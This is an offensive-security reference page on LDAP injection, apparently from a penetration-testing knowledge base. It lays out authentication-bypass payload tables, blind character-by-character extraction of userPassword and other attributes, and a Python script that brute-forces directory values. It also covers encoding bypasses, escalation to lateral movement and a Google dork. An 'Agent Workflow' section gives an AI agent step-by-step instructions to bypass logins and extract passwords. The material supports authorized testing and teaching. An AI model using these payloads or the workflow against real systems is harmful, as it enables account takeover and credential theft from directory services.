# LDAP Injection

> **Summary**: Injection attack that manipulates LDAP queries constructed from unsanitized user input, allowing unauthorized access to directory services.
> **Impact**: Authentication bypass, data exfiltration of directory entries (usernames, passwords, emails, roles), and unauthorized enumeration of LDAP schema.
> **Typical Severity**: High

---

## Detection

### Indicators
- Login forms that query LDAP backends (Active Directory, OpenLDAP)
- Search functionality against corporate directories
- User lookup or profile features backed by LDAP
- Error messages revealing LDAP syntax (e.g., "Invalid DN syntax", "Bad search filter")

### Automated Detection
```bash
# Fuzz input fields with LDAP metacharacters
echo '*)(objectClass=*)' | httpx -silent
# Use Burp Suite Intruder with LDAP fuzz list
# https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LDAP%20Injection/Intruder/LDAP_FUZZ.txt
```

### Manual Detection
1. Input `*` in username and password fields -- if login succeeds, LDAP injection is likely
2. Input `)` or `)(` and observe for errors or behavioral changes
3. Test boolean logic: `admin)(|(password=*)` vs `admin)(|(password=invalid)`
4. Compare responses to distinguish injectable vs non-injectable parameters

---

## Exploitation

### Prerequisites
- User-controlled input is concatenated into an LDAP search filter
- Application does not sanitize LDAP metacharacters: `*`, `(`, `)`, `|`, `&`, `!`, `\`

### LDAP Search Filter Syntax

| Operator | Syntax | Example | Description |
|----------|--------|---------|-------------|
| Equality | `=` | `(name=admin)` | Exact match on attribute value |
| Greater-Or-Equal | `>=` | `(uid>=10)` | Value >= threshold |
| Less-Or-Equal | `<=` | `(uid<=10)` | Value <= threshold |
| Approximate | `~=` | `(name~=admin)` | Fuzzy/phonetic match |
| AND | `(&()())` | `(&(uid=admin)(pass=secret))` | Both conditions must be true |
| OR | `(\|()())` | `(\|(uid=admin)(uid=root))` | Either condition must be true |
| NOT | `(!())` | `(!(uid=guest))` | Negation |
| Wildcard | `*` | `(name=a*)` | Matches any string |
| Absolute TRUE | `(&)` | `(&)` | Always true |
| Absolute FALSE | `(\|)` | `(\|)` | Always false |

### Step-by-Step

1. **Identify injection point** -- locate parameters that flow into LDAP queries (login, search, directory lookup)
2. **Confirm injection** -- input `*` for both username and password; successful login confirms vulnerability
3. **Determine backend** -- OpenLDAP executes only the first filter; Microsoft AD throws errors on multiple filters; SunOne executes both
4. **Extract data** -- use blind boolean-based injection to enumerate attributes character-by-character
5. **Success criteria** -- authenticated as another user, or extracted attribute values from directory entries

### Authentication Bypass Payloads

| Description | Username | Password | Resulting Filter |
|-------------|----------|----------|------------------|
| Wildcard bypass | `*` | `*` | `(&(uid=*)(userPassword=*))` |
| Target specific user | `admin*` | `*` | `(&(uid=admin*)(userPassword=*))` |
| Universal TRUE | `admin)(\|(&` | `invalid)` | `(&(uid=admin)(\|(&)(userPassword=invalid)))` |
| Null byte truncation | `*))%00` | `any` | `(&(uid=*))%00(userPassword=any))` |
| NOT logic bypass | `admin)(!(&(\|` | `any))` | `(&(uid=admin)(!(& (\|)(userPassword=any))))` |
| OR injection | `*)(|(password=*` | `test)` | `(&(uid=*)(|(password=*)(password=test))` |
| Double OR | `admin))(|(\|` | `any` | `(&(uid=admin))(|(\|)(userPassword=any))` |

### Additional Login Bypass Payloads
```
user=*)(&          password=*)(&          --> (&(user=*)(&)(password=*)(&))
user=*)(|(&        pass=pwd)              --> (&(user=*)(|(&)(pass=pwd))
user=admin)(&)     password=pwd           --> (&(user=admin)(&))(password=pwd)
```

### Blind LDAP Injection (Data Exfiltration)

Boolean-based extraction -- brute-force attribute values character-by-character using wildcards:

| Step | Username | Password | Filter | Result |
|------|----------|----------|--------|--------|
| 1 | `<TARGET_USER>` | `*` | `(&(uid=<TARGET_USER>)(userPassword=*))` | Baseline TRUE |
| 2 | `<TARGET_USER>` | `a*` | `(&(uid=<TARGET_USER>)(userPassword=a*))` | FALSE |
| 3 | `<TARGET_USER>` | `p*` | `(&(uid=<TARGET_USER>)(userPassword=p*))` | TRUE -- first char is `p` |
| 4 | `<TARGET_USER>` | `p@*` | `(&(uid=<TARGET_USER>)(userPassword=p@*))` | TRUE -- second char is `@` |
| ... | ... | `p@ssw0rd` | `(&(uid=<TARGET_USER>)(userPassword=p@ssw0rd))` | Final value confirmed |

### Blind LDAP Injection -- Confirming True/False

```bash
# TRUE condition -- returns data
Payload: *)(objectClass=*))(&objectClass=void
Filter:  (&(objectClass=*)(objectClass=*))(&objectClass=void)(type=<VALUE>*))

# FALSE condition -- returns nothing
Payload: void)(objectClass=void))(&objectClass=void
Filter:  (&(objectClass=void)(objectClass=void))(&objectClass=void)(type=<VALUE>*))
```

### Attribute Enumeration

Brute-force LDAP attribute names using the default attributes wordlist:

```
# Test if attribute exists
*)(<ATTRIBUTE>=*)
# Example: *)(mail=*)  --> if TRUE, the "mail" attribute exists
```

Common LDAP attributes to enumerate: `uid`, `cn`, `sn`, `mail`, `userPassword`, `telephoneNumber`, `description`, `memberOf`, `objectClass`, `givenName`, `homeDirectory`

### Proof of Concept

```python
import requests
import string

url = "<TARGET_URL>/login"
alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"
attributes = ["uid", "cn", "sn", "mail", "userPassword", "description", "memberOf"]

for attribute in attributes:
    value = ""
    finish = False
    while not finish:
        for char in alphabet:
            query = f"*)({attribute}={value}{char}*"
            data = {"login": query, "password": "any"}
            r = requests.post(url, data=data)
            if "<SUCCESS_INDICATOR>" in r.text:
                value += char
                break
            if char == alphabet[-1]:
                finish = True
                print(f"{attribute}: {value}")
```

---

## Bypasses

- **Null byte injection**: `%00` to truncate the filter and ignore password check
- **Comment injection**: some LDAP implementations support comments that break filter logic
- **Unicode encoding**: `%2a` for `*`, `%28` for `(`, `%29` for `)` to bypass input filters
- **Double encoding**: `%252a` to bypass WAF decoding
- **Case manipulation**: LDAP attribute names are case-insensitive (`userPassword` = `USERPASSWORD`)

---

## Escalation

- **Enumerate all users**: iterate with `*)(uid=<CHAR>*` to discover all usernames
- **Extract group memberships**: target `memberOf` attribute for privilege mapping
- **Password extraction**: blind-extract `userPassword` for all discovered users
- **Lateral movement**: use extracted credentials against other services (SSH, VPN, web apps)
- **Admin takeover**: target admin-level accounts by enumerating `memberOf=cn=admins,*`

---

## Tools

| Tool | Usage |
|------|-------|
| [PayloadsAllTheThings LDAP](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection) | Payload reference and fuzzing lists |
| [LDAP_FUZZ wordlist](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LDAP%20Injection/Intruder/LDAP_FUZZ.txt) | Intruder/fuzzer wordlist for LDAP metacharacters |
| [LDAP attributes list](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LDAP%20Injection/Intruder/LDAP_attributes.txt) | Default LDAP attribute names for enumeration |
| Burp Suite Intruder | Automate blind LDAP injection extraction |
| Custom Python script | Character-by-character blind extraction (see PoC above) |

---

## Google Dorks

```
intitle:"phpLDAPadmin" inurl:cmd.php
```

---

## Agent Workflow
> Step-by-step instructions for an AI agent to test for LDAP injection.

### Phase 1: Discovery
1. Identify LDAP-backed functionality: login forms, user search, address book lookup, group membership queries.
2. Look for LDAP-related error messages: "Invalid DN syntax", "Bad search filter", "javax.naming.NamingException".
3. Check if the application exposes phpLDAPadmin or similar LDAP management interfaces.

### Phase 2: Validation
1. **Wildcard test** -- input `*` in username and password fields; if login succeeds or all users are returned, LDAP injection is likely.
2. **Boolean-based** -- compare responses between `admin)(|(password=*)` (TRUE condition) and `admin)(|(password=invalid123xyz)` (FALSE condition); differential response confirms injection.
3. **Error-based** -- inject `)` or `)(` and observe for LDAP syntax errors in the response.

### Phase 3: Exploitation
1. **Authentication bypass** -- inject `*)(objectClass=*)` or `admin)(&)` to bypass login:
   ```
   Username: admin)(|(password=*
   Password: anything
   ```
2. **Data exfiltration** -- enumerate attributes character by character using boolean-based blind injection:
   ```
   admin)(|(password=a*))   --> response differs if password starts with 'a'
   admin)(|(password=b*))   --> continue until match found
   ```
3. **User enumeration** -- inject `*)(uid=*` to list all users in the directory.
4. **Attribute discovery** -- test for common LDAP attributes: `mail`, `telephoneNumber`, `description`, `userPassword`.

### Phase 4: Escalation
1. Extract password hashes or cleartext passwords from `userPassword` attributes.
2. Enumerate group memberships to identify privileged accounts (`memberOf=CN=Domain Admins`).
3. Use extracted credentials for lateral movement to other services (SSH, VPN, email).

## Decision Tree

```
Start: Identify LDAP-backed functionality
  |
  +---> Wildcard (*) in username returns data?
  |       +---> Yes: LDAP injection confirmed --> Test auth bypass
  |       +---> No: Test )(| injection syntax
  |
  +---> Boolean differential response?
  |       +---> Yes: Blind LDAP injection --> Character-by-character extraction
  |       +---> No: Test error-based injection
  |
  +---> Authentication bypass works?
  |       +---> Yes: Access admin account, enumerate users
  |
  +---> Blind extraction possible?
          +---> Yes: Extract userPassword, mail, telephoneNumber attributes
```

## Success Criteria
- [ ] LDAP-backed functionality identified (login, search, lookup)
- [ ] LDAP injection confirmed via wildcard or boolean-based differential responses
- [ ] Authentication bypass achieved via injected filter
- [ ] If data exfiltration: user attributes (passwords, emails) extracted via blind injection
- [ ] If enumeration: full user list retrieved from directory

## References

- [OWASP LDAP Injection](https://owasp.org/www-community/attacks/LDAP_Injection)
- [PayloadsAllTheThings - LDAP Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection)
- [BlackHat Europe 2008 - LDAP Injection & Blind LDAP Injection](https://www.blackhat.com/presentations/bh-europe-08/Alonso-Parada/Whitepaper/bh-eu-08-alonso-parada-WP.pdf)
- [LDAP PosixAccount Attributes Reference](https://tldp.org/HOWTO/archived/LDAP-Implementation-HOWTO/schemas.html)

---

**See also**: [SQL Injection](sqli.md) | [XPath Injection](x-path-injection.md)
